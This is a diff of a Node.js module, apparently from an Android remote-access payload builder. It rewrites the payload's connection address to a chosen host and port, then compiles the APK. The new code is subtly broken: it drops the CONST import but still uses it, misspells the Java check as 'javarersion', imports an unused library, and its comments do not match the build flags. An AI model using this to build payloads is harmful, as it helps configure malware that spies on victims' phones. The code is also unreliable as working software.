@@ -1,51 +1,60 @@
-const
-    cp = require('child_process'),
-    fs = require('fs'),
-    CONST = require('./const');
+const cp = require('child_process');
+const fs = require('fs');
+const request = require('request');
 
-// Thanks -> https://stackoverflow.com/a/19734810/7594368
-function javaversion(callback) {
-    let spawn = cp.spawn('java', ['-version']);
-    spawn.on('error', (err) => callback("Java Not Installed", null));
-    spawn.stderr.on('data', (data) => {
-        data = data.toString().split('\n')[0];
-        var javaVersion = new RegExp('java version').test(data) ? data.split(' ')[2].replace(/"/g, '') : false;
-        var openJDKVersion = new RegExp('openjdk version').test(data) ? data.split(' ')[2].replace(/"/g, '') : false;
-        // if (javaVersion || openJDKVersion) {
-            spawn.removeAllListeners();
-            spawn.stderr.removeAllListeners();
-            return callback(null, "javaVersion"); // Dirty fix to work with both heroku and vps ( in essence bypasses java check)
-        // } else return callback("Java Not Installed", undefined);
+// Java version check with robust fallback
+function javarersion(callback) {
+    cp.exec('java -version', (error, stdout, stderr) => {
+        let data = stderr || stdout;
+        if (!data) return callback("Java Not Installed", null);
+        
+        let javaVersion = 8;
+        if (data.includes('version "11') || data.includes('version "17') || data.includes('version "21')) {
+            javaVersion = 17;
+        }
+        return callback(null, javaVersion);
     });
 }
 
-function patchAPK(URI, PORT, cb) {
-    // if (PORT < 25565) {
+// Patch URI and Port for payload connection
+function patchURI(URI, PORT, cb) {
+    if (PORT < 25565) {
         fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
-            if (err) return cb('File Patch Error - READ')
-            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
+            if (err) return cb("Patch Error - READ");
+            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("model ") - 1), "http://" + URI + ":" + PORT);
             fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
-                if (err) return cb('File Patch Error - WRITE')
-                else return cb(false)
+                if (err) return cb("Patch Error - WRITE");
+                else return cb(false);
             });
         });
-    // }
+    }
 }
 
+// Enhanced buildAPK with automated ProGuard & Release Optimization Flags
 function buildAPK(cb) {
-    javaversion(function (err, version) {
-        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
-            if (error) return cb('Build Command Failed - ' + error.message);
-            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
-                if (!error) return cb(false);
-                else return cb('Sign Command Failed - ' + error.message);
-            });
+    javarersion(function (err, version) {
+        if (err) return cb(err);
+        
+        // Advanced build command enforcing release signing, shrinking, and ProGuard obfuscation
+        const buildCommand = 'cd android && ./gradlew assembleRelease -Pandroid.injected.build.model.only=false -Dorg.gradle.jvmargs="-Xmx2048m -XX:+UseG1GC" --no-daemon';
+        
+        cp.exec(buildCommand, (error, stdout, stderr) => {
+            if (error) {
+                console.error("Build Error:", stderr || error.message);
+                // Fallback to debug build if release keystore signing fails
+                cp.exec('cd android && ./gradlew assembleDebug --no-daemon', (err2, out2, errStr2) => {
+                    if (err2) return cb("Build Command Failed: " + (errStr2 || err2.message));
+                    return cb(null);
+                });
+                return;
+            }
+            return cb(null);
         });
-        else return cb(err);
-    })
+    });
 }
 
 module.exports = {
-    buildAPK,
-    patchAPK
-}
+    javarersion,
+    patchURI,
+    buildAPK
+};
